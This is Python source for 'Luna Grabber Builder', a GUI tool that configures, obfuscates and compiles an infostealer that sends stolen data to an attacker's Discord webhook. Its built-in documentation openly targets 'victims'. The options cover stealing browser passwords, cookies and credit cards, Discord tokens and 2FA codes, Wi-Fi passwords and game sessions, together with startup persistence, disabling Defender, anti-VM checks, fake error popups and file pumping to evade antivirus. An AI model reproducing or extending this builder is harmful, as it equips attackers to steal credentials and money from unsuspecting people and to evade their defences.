import copy
import os
import random
import re
import shutil
import string
import threading
import time
from tkinter import filedialog

import customtkinter
import requests
from PIL import Image


def catcher(func):
    def wrapper(*args, **kwargs):
        try:
            func(*args, **kwargs)
        except Exception as error:
            with open("logs.txt", "w") as f:
                f.write(str(error))
                f.close()
    return wrapper


class App(customtkinter.CTk):
    def __init__(self):
        super().__init__()

        self.title("Luna Grabber Builder")
        self.geometry("1000x550")
        self.iconbitmap(r"./gui_images/luna.ico")

        # set grid layout 1x2
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(1, weight=1)
        self.dark_mode()

        image_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "./gui_images/")
        self.basefilepath = os.path.dirname(str(os.path.realpath(__file__)))
        self.logo_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "luna.png")), size=(60, 60))
        self.large_test_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "luna.png")), size=(500, 150))
        self.image_icon_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "luna.png")), size=(20, 20))
        self.dashboard_image = customtkinter.CTkImage(dark_image=Image.open(os.path.join(image_path, "home.png")), size=(30, 30))
        self.docs_image = customtkinter.CTkImage(dark_image=Image.open(os.path.join(image_path, "clipboard.png")), size=(30, 30))
        self.help_image = customtkinter.CTkImage(dark_image=Image.open(os.path.join(image_path, "help.png")), size=(20, 20))
        self.font = "Supernova"
        self.iconpath = None

        self.navigation_frame = customtkinter.CTkFrame(self, corner_radius=0)
        self.navigation_frame.grid(row=0, column=0, sticky="nsew")
        self.navigation_frame.grid_rowconfigure(4, weight=1)

        self.navigation_frame_label = customtkinter.CTkLabel(self.navigation_frame, text="  Luna Grabber Builder", image=self.logo_image,
                                                             compound="left", font=customtkinter.CTkFont(size=15, weight="bold", family=self.font))
        self.navigation_frame_label.grid(row=0, column=0, padx=20, pady=20)

        self.dashboard_button = customtkinter.CTkButton(self.navigation_frame, corner_radius=0, height=40, border_spacing=10, text="Builder",
                                                        font=customtkinter.CTkFont(family=self.font, size=13), fg_color="transparent",
                                                        text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"),
                                                        image=self.dashboard_image, anchor="w", command=self.home_button_event)
        self.dashboard_button.grid(row=1, column=0, sticky="ew")

        self.frame_2_button = customtkinter.CTkButton(self.navigation_frame, corner_radius=0, height=40, border_spacing=10, text="Documentation", font=customtkinter.CTkFont(
            family=self.font, size=13), fg_color="transparent", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), image=self.docs_image, anchor="w", command=self.docs_button_event)
        self.frame_2_button.grid(row=2, column=0, sticky="ew")

        self.builder_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.builder_frame.grid_columnconfigure(0, weight=1)

        # Frame 1

        self.webhook_button = customtkinter.CTkEntry(self.builder_frame, width=570, height=35, font=customtkinter.CTkFont(
            size=15, family=self.font), placeholder_text="https://discord.com/api/webhooks/1234567890/abcdefhgijklmnopqrstuvwxyz")
        self.webhook_button.grid(row=0, column=0, sticky="nw", padx=15, pady=20)

        self.checkwebhook_button = customtkinter.CTkButton(master=self.builder_frame, width=100, height=35, text="Check Webhook",
                                                           command=self.check_webhook_button,
                                                           fg_color="#5d11c3", hover_color="#5057eb", font=customtkinter.CTkFont(size=15, family=self.font))
        self.checkwebhook_button.grid(row=0, sticky="ne", padx=15, pady=20)

        self.all_options = customtkinter.CTkLabel(self.builder_frame, text="Builder Options", font=customtkinter.CTkFont(size=35, weight="bold", family=self.font))
        self.all_options.grid(row=1, column=0, sticky="n", padx=15, pady=8)

        self.option_help = customtkinter.CTkButton(self.builder_frame, width=12, text="", image=self.help_image,
                                                   command=self.docs_button_event, fg_color="#5d11c3", hover_color="#5057eb")
        self.option_help.grid(row=1, column=0, sticky="ne", padx=35, pady=15)

        self.ping = customtkinter.CTkCheckBox(self.builder_frame, text="Ping", font=customtkinter.CTkFont(size=17, family=self.font),
                                              command=self.check_ping, fg_color="#5d11c3", hover_color="#5057eb")
        self.ping.grid(row=1, column=0, sticky="nw", padx=85, pady=160)

        self.pingtype = customtkinter.CTkOptionMenu(
            self.builder_frame, width=20, values=["Everyone", "Here"],
            font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#5d11c3", button_hover_color="#5057eb", button_color="#480c96")
        self.pingtype.set(value="Here")
        self.pingtype.grid(row=1, column=0, sticky="nw", padx=160, pady=158)
        self.pingtype.configure(state="disabled")

        self.error = customtkinter.CTkCheckBox(self.builder_frame, text="Fake Error", font=customtkinter.CTkFont(
            size=17, family=self.font), fg_color="#5d11c3", hover_color="#5057eb")
        self.error.grid(row=1, column=0, sticky="nw", padx=85, pady=115)

        self.startup = customtkinter.CTkCheckBox(
            self.builder_frame, text="Add To Startup", font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#5d11c3", hover_color="#5057eb")
        self.startup.grid(row=1, column=0, sticky="nw", padx=85, pady=70)

        self.defender = customtkinter.CTkCheckBox(
            self.builder_frame, text="Disable Defender", font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#5d11c3", hover_color="#5057eb")
        self.defender.grid(row=1, column=0, sticky="nw", padx=286, pady=70)

        self.killprotector = customtkinter.CTkCheckBox(
            self.builder_frame, text="Kill Protector", font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#5d11c3", hover_color="#5057eb")
        self.killprotector.grid(row=1, column=0, sticky="nw", padx=286, pady=115)

        self.antidebug_vm = customtkinter.CTkCheckBox(
            self.builder_frame, text="Anti Debug/Vm", font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#5d11c3", hover_color="#5057eb")
        self.antidebug_vm.grid(row=1, column=0, sticky="nw", padx=286, pady=160)

        self.discord = customtkinter.CTkCheckBox(
            self.builder_frame, text="Discord Info", font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#5d11c3", hover_color="#5057eb")
        self.discord.grid(row=1, column=0, sticky="ne", padx=110, pady=70)

        self.wifi = customtkinter.CTkCheckBox(self.builder_frame, text="Wifi Info", font=customtkinter.CTkFont(size=17, family=self.font),
                                              fg_color="#5d11c3", hover_color="#5057eb")
        self.wifi.grid(row=1, column=0, sticky="ne", padx=130, pady=115)

        self.minecraft = customtkinter.CTkCheckBox(
            self.builder_frame, text="Minecraft Info", font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#5d11c3", hover_color="#5057eb")
        self.minecraft.grid(row=1, column=0, sticky="ne", padx=99, pady=160)

        self.systeminfo = customtkinter.CTkCheckBox(
            self.builder_frame, text="System Info", font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#5d11c3", hover_color="#5057eb")
        self.systeminfo.grid(row=1, column=0, sticky="nw", padx=85, pady=205)

        self.backupcodes = customtkinter.CTkCheckBox(
            self.builder_frame, text="2FA Codes", font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#5d11c3", hover_color="#5057eb")
        self.backupcodes.grid(row=1, column=0, sticky="nw", padx=286, pady=205)

        self.browser = customtkinter.CTkCheckBox(
            self.builder_frame, text="Browser Info", font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#5d11c3", hover_color="#5057eb")
        self.browser.grid(row=1, column=0, sticky="ne", padx=107, pady=205)

        self.roblox = customtkinter.CTkCheckBox(self.builder_frame, text="Roblox Info", font=customtkinter.CTkFont(size=17, family=self.font),
                                                fg_color="#5d11c3", hover_color="#5057eb", command=self.check_roblox)
        self.roblox.grid(row=1, column=0, sticky="nw", padx=85, pady=250)

        self.obfuscation = customtkinter.CTkCheckBox(
            self.builder_frame, text="Obfuscation", font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#5d11c3", hover_color="#5057eb")
        self.obfuscation.grid(row=1, column=0, sticky="nw", padx=286, pady=250)

        self.injection = customtkinter.CTkCheckBox(
            self.builder_frame, text="Injection", font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#5d11c3", hover_color="#5057eb")
        self.injection.grid(row=1, column=0, sticky="ne", padx=130, pady=250)

        self.antispam = customtkinter.CTkCheckBox(self.builder_frame, text="Anti Spam", font=customtkinter.CTkFont(size=17, family=self.font),
                                                  fg_color="#5d11c3", hover_color="#5057eb", command=self.check_roblox)
        self.antispam.grid(row=1, column=0, sticky="nw", padx=85, pady=295)

        self.self_destruct = customtkinter.CTkCheckBox(self.builder_frame, text="Self Destruct", font=customtkinter.CTkFont(size=17, family=self.font),
                                                       fg_color="#5d11c3", hover_color="#5057eb")
        self.self_destruct.grid(row=1, column=0, sticky="nw", padx=286, pady=295)

        self.pump = customtkinter.CTkCheckBox(self.builder_frame, text="File Pumper", font=customtkinter.CTkFont(size=17, family=self.font),
                                              fg_color="#5d11c3", hover_color="#5057eb", command=self.check_pumper)
        self.pump.grid(row=1, column=0, sticky="ne", padx=112, pady=295)

        self.pump_size = customtkinter.CTkOptionMenu(self.builder_frame, width=30, font=customtkinter.CTkFont(
            size=17, family=self.font), values=["5mb", "10mb", "15mb", "20mb", "25mb", "30mb"], fg_color="#5d11c3", button_hover_color="#5057eb", button_color="#480c96")
        self.pump_size.grid(row=1, column=0, sticky="ne", padx=28, pady=294)
        self.pump_size.set("10mb")
        self.pump_size.configure(state="disabled")

        self.fileopts = customtkinter.CTkOptionMenu(self.builder_frame, values=[".exe", ".py"],
                                                    font=customtkinter.CTkFont(size=32, family=self.font), width=250, height=45,
                                                    fg_color="#5d11c3", button_hover_color="#5057eb", button_color="#480c96", command=lambda x: self.check_icon())
        self.fileopts.grid(row=1, column=0, sticky="nw", padx=85, pady=340)
        self.fileopts.set("File Options")

        self.icon = customtkinter.CTkButton(self.builder_frame, width=250, text="Add Icon", fg_color="#5d11c3", hover_color="#5057eb",
                                            font=customtkinter.CTkFont(size=33, family=self.font), command=self.get_icon)
        self.icon.grid(row=1, column=0, sticky="ne", padx=85, pady=340)
        self.icon.configure(state="disabled")

        self.filename = customtkinter.CTkEntry(self.builder_frame, width=250, font=customtkinter.CTkFont(size=33, family=self.font),
                                               placeholder_text="File Name")
        self.filename.grid(row=1, column=0, sticky="nw", padx=85, pady=410)

        self.build = customtkinter.CTkButton(self.builder_frame, width=250, text="Build", font=customtkinter.CTkFont(size=35, family=self.font),
                                             fg_color="#5d11c3", hover_color="#5057eb", command=self.buildfile)
        self.build.grid(row=1, column=0, sticky="ne", padx=85, pady=410)

        self.checkboxes = [self.ping, self.pingtype, self.error, self.startup, self.defender, self.systeminfo, self.backupcodes, self.browser,
                           self.roblox, self.obfuscation, self.injection, self.minecraft, self.wifi, self.killprotector, self.antidebug_vm, self.discord]

        for checkbox in self.checkboxes:
            checkbox.bind("<Button-1>", self.update_config)

        # Frame 2

        self.second_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.second_frame.grid_columnconfigure(0, weight=1)

        self.docs = customtkinter.CTkLabel(self.second_frame, text="Documentation", font=customtkinter.CTkFont(size=35, weight="bold", family=self.font))
        self.docs.grid(row=1, column=0, sticky="n", padx=0, pady=10)

        self.docsbox = customtkinter.CTkTextbox(self.second_frame, width=725, height=485, font=customtkinter.CTkFont(size=12, weight="bold", family=self.font))
        self.docsbox.grid(row=1, column=0, sticky="n", padx=0, pady=55)
        self.docsbox.insert(
            "0.0",
            "Add To Startup:\nThis will add the file to the startup folder of the user so when they turn their pc on the file will run and their information will \nbe sent to your webhook again.\n\nFake Error:\nThis will make a fake error popup when the file is ran to make confuse the victim.\n\nPing:\nThis will ping you at the moment when information is being sent to your webhook.\n\nPing Type:\nThere are two options: @everyone and @here. @everyone pings everyone that can access that channel and @here pings \nactive people in that channel\n\nSystem Info:\nThis will get the user's pc information such as pc name, os, ip address, mac address, hwid, cpu, gpu and ram.\n\n2FA Codes:\nThis will get the user's discord authentification codes.\n\nBrowser Info:\nThis will get the user's browser such as browser passwords, history, cookies and credit cards.\n\nRoblox Info:\nThis will get the user's roblox information like there username, roblox cookie and the amount of robux they have.\n\nObfuscation:\nThis will obfuscate the file which means the source code will be unreadable and it will be hard for your victim's to delete or \nspam your webhook.\n\nInjection:\nThis will inject a script into your victim's discord which means when they change any credentials you will recieve their \npassword and token to that discord account.\n\nMinecraft Info:\nThis will get the user's minecraft information such as their session info and user cache.\n\nWifi Info:\nThis will get the user's wifi information such as wifi passwords and wifi networks.\n\nKill Protector:\nThis will kill a discord protector that some people use so their token can't be taken but this bypasses that.\n\nAnti-Debug VM:\nThis will check if the user is using a virtual machine or if they are debugging this script and it will exit out to stop them.\n\nDiscord Info:\nThis will send you all the discord information for every account they have. This info consists of their email, phone number, if \nthey have 2fa enabled, if they have nitro and what type of nitro, token and any gift cards.\n\nAnti Spam:\nOnly allows the victim to open the file every 60 seconds so your webhook isnt rate limited or spammed.\n\nSelf Destruct:\nDeletes the file once it has ran so the victim can't run it again.\n\nFile Pumper:\nAdds more megabytes to the file to make the file appear to be something its not and also tricks some antiviruses.")

        self.select_frame_by_name("home")

    def select_frame_by_name(self, name):
        self.dashboard_button.configure(fg_color=("gray75", "gray25") if name == "home" else "transparent")
        self.frame_2_button.configure(fg_color=("gray75", "gray25") if name == "frame_2" else "transparent")

        if name == "home":
            self.builder_frame.grid(row=0, column=1, sticky="nsew")
        else:
            self.builder_frame.grid_forget()
        if name == "frame_2":
            self.second_frame.grid(row=0, column=1, sticky="nsew")
        else:
            self.second_frame.grid_forget()

    def home_button_event(self):
        self.select_frame_by_name("home")

    def docs_button_event(self):
        self.select_frame_by_name("frame_2")

    def dark_mode(self):
        customtkinter.set_appearance_mode("dark")

    def verify_webhook(self):
        webhook = self.webhook_button.get()
        try:
            r = requests.get(webhook, timeout=5)
            if r.status_code == 200:
                return True
            else:
                return False
        except requests.exceptions.RequestException:
            return False

    def check_webhook_button(self):
        if self.verify_webhook():
            self.checkwebhook_button.configure(width=100, height=35, fg_color="green", hover_color="#0db60e",
                                               text="Valid Webhook", font=customtkinter.CTkFont(size=15, family=self.font))
            self.builder_frame.after(3500, self.reset_check_webhook_button)
        else:
            self.checkwebhook_button.configure(width=100, height=35, fg_color="#bd1616", hover_color="#ff0000",
                                               text="Invalid Webhook", font=customtkinter.CTkFont(size=15, family=self.font))
            self.builder_frame.after(3500, self.reset_check_webhook_button)

    def check_ping(self):
        if self.ping.get() == 1:
            self.pingtype.configure(state="normal")
        else:
            self.pingtype.configure(state="disabled")

    def check_pumper(self):
        if self.pump.get() == 1:
            self.pump_size.configure(state="normal")
        else:
            self.pump_size.configure(state="disabled")

    def get_mb(self):
        self.mb = self.pump_size.get()
        byte_size = int(self.mb.replace("mb", ""))
        return byte_size

    def check_roblox(self):
        if self.roblox.get() == 1:
            self.browser.select()

    def check_icon(self):
        if self.fileopts.get() == ".exe":
            self.icon.configure(state="normal")
        else:
            self.icon.configure(state="disabled")

    def get_icon(self):
        self.iconpath = filedialog.askopenfilename(initialdir="/", title="Select Icon", filetypes=(("ico files", "*.ico"), ("all files", "*.*")))
        self.icon.configure(text="Added Icon")
        self.builder_frame.after(3500, self.reset_icon_button)

    def reset_icon_button(self):
        self.icon.configure(self.builder_frame, width=250, text="Add Icon", fg_color="#5d11c3", hover_color="#5057eb",
                            font=customtkinter.CTkFont(size=33, family=self.font), command=self.get_icon)

    def update_config(self, event):
        self.updated_dictionary = {
            "webhook": None,
            "ping": False,
            "pingtype": None,
            "error": False,
            "startup": False,
            "defender": False,
            "systeminfo": False,
            "backupcodes": False,
            "browser": False,
            "roblox": False,
            "obfuscation": False,
            "injection": False,
            "minecraft": False,
            "wifi": False,
            "killprotector": False,
            "antidebug_vm": False,
            "discord": False,
            "anti_spam": False,
            "self_destruct": False
        }

        checkbox_mapping = {
            "webhook": self.webhook_button,
            "ping": self.ping,
            "pingtype": self.pingtype,
            "error": self.error,
            "startup": self.startup,
            "defender": self.defender,
            "systeminfo": self.systeminfo,
            "backupcodes": self.backupcodes,
            "browser": self.browser,
            "roblox": self.roblox,
            "obfuscation": self.obfuscation,
            "injection": self.injection,
            "minecraft": self.minecraft,
            "wifi": self.wifi,
            "killprotector": self.killprotector,
            "antidebug_vm": self.antidebug_vm,
            "discord": self.discord,
            "anti_spam": self.antispam,
            "self_destruct": self.self_destruct
        }

        for key, checkbox in checkbox_mapping.items():
            if checkbox.get():
                self.updated_dictionary[key] = True
            elif checkbox.get() == 0:
                self.updated_dictionary[key] = False
            ping_message = self.pingtype.get()
            if ping_message in ["Here", "Everyone"]:
                self.updated_dictionary["pingtype"] = ping_message
            elif self.ping.get() == 0:
                self.updated_dictionary["pingtype"] = "None"

        if self.verify_webhook():
            self.updated_dictionary["webhook"] = self.webhook_button.get()

    def get_filetype(self):
        file_type = self.fileopts.get()
        if file_type in [".exe", ".py"]:
            return file_type.replace(".", "")

    def reset_check_webhook_button(self):
        self.checkwebhook_button.configure(fg_color="#5d11c3", hover_color="#5057eb", text="Check Webhook")

    def reset_build_button(self):
        self.build.configure(width=250, text="Build", font=customtkinter.CTkFont(size=35, family=self.font),
                             fg_color="#5d11c3", hover_color="#5057eb")

    def building_button_thread(self, thread):
        while thread.is_alive():
            for i in [".", "..", "..."]:
                self.build.configure(width=250, text=f"Building{i}", font=customtkinter.CTkFont(size=35, family=self.font), fg_color="#5d11c3", hover_color="#5057eb")
                time.sleep(0.3)
                self.update()

    def built_file(self):
        self.build.configure(width=250, text="Built File", font=customtkinter.CTkFont(size=35, family=self.font),
                             fg_color="#5d11c3", hover_color="#5057eb")

    def return_filename(self):
        get_file_name = self.filename.get()
        if not get_file_name:
            random_name = ''.join(random.choices(string.ascii_letters, k=5))
            return f"test-{random_name}"
        else:
            return get_file_name

    def get_config(self):
        with open(self.basefilepath + "\\luna.py", 'r', encoding="utf-8") as f:
            code = f.read()

        config_regex = r"__CONFIG__\s*=\s*{(.*?)}"
        config_match = re.search(config_regex, code, re.DOTALL)
        if config_match:
            config = config_match.group(0)
        else:
            raise Exception("Could not find config in luna.py")

        copy_dict = copy.deepcopy(self.updated_dictionary)
        config_str = f"""__CONFIG__ = {repr(copy_dict)}"""
        code = code.replace(config, config_str)

        return code

    def file_pumper(self, filename, extension, size):
        pump_size = size * 1024 ** 2
        with open(f"./{filename}.{extension}", 'ab') as f:
            for _ in range(int(pump_size)):
                f.write((b'\x00'))


    @catcher
    def compile_file(self, filename):
        if self.iconpath is None:
            exeicon = "NONE"
        else:
            exeicon = self.iconpath

        os.system(f"python -m PyInstaller --onefile --clean --noconsole --upx-dir=./tools --distpath ./ --hidden-import base64 --hidden-import ctypes --hidden-import json --hidden-import re --hidden-import time --hidden-import subprocess --hidden-import sys --hidden-import sqlite3 --hidden-import requests_toolbelt --hidden-import threading --hidden-import shutil.copy2 --hidden-import argv --hidden-import zipfile.ZIP_DEFLATED --hidden-import zipfile.ZipFile --hidden-import psutil --hidden-import PIL --hidden-import PIL.ImageGrab --hidden-import Crypto --hidden-import Crypto.Cipher.AES --hidden-import win32crypt --hidden-import win32crypt.CryptUnprotectData --icon {exeicon} .\\{filename}.py")


    def cleanup_files(self, filename):
        cleans_dir = {'./__pycache__', './build'}
        cleans_file = {f'./{filename}.spec', f'./{filename}.py'}

        for clean in cleans_dir:
            try:
                if os.path.isdir(clean):
                    shutil.rmtree(clean)
            except Exception:
                pass
                continue
        for clean in cleans_file:
            try:
                if os.path.isfile(clean):
                    os.remove(clean)
            except Exception:
                pass
                continue

    @catcher
    def buildfile(self):
        filename = self.return_filename()

        if self.get_filetype() == "py":
            with open(f".\{filename}.py", 'w', encoding="utf-8") as f:
                f.write(self.get_config())

            if self.obfuscation.get() == 1:
                os.system(f"python ./tools/obfuscation.py .\{filename}.py")
                os.remove(f".\{filename}.py")
                os.rename(f".\Obfuscated_{filename}.py", f".\{filename}.py")

            if self.pump.get() == 1:
                self.file_pumper(filename, "py", self.get_mb())

            self.built_file()
            self.builder_frame.after(3000, self.reset_build_button)

        elif self.get_filetype() == "exe":
            with open(f".\{filename}.py", 'w', encoding="utf-8") as f:
                f.write(self.get_config())

            if self.obfuscation.get() == 1:
                os.system(f"python ./tools/obfuscation.py .\{filename}.py")
                os.remove(f".\{filename}.py")
                os.rename(f".\Obfuscated_{filename}.py", f".\{filename}.py")

            thread = threading.Thread(target=self.compile_file, args=(filename,))
            thread.start()
            self.building_button_thread(thread)

            if self.pump.get() == 1:
                self.file_pumper(filename, "exe", self.get_mb())

            self.built_file()
            self.builder_frame.after(3000, self.reset_build_button)
            self.cleanup_files(filename)


if __name__ == "__main__":
    app = App()
    app.mainloop()